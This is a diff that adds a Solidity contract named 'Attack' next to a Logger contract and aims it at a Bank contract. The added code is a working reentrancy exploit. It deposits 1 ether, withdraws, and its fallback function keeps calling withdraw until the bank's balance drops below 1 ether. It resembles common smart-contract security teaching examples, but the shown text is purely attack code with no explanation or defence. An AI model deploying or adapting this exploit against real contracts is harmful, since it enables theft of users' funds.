@@ -39,3 +39,26 @@ contract Logger {
         emit Log(_caller, _amount, _action);
     }
 }
+
+contract Attack {
+    Bank bank;
+
+    constructor(Bank _bank) {
+        bank = Bank(_bank);
+    }
+
+    fallback() external payable {
+        if (address(bank).balance >= 1 ether) {
+            bank.withdraw(1 ether);
+        }
+    }
+
+    function attack() public payable {
+        bank.deposit{value: 1 ether}();
+        bank.withdraw(1 ether);
+    }
+
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+}
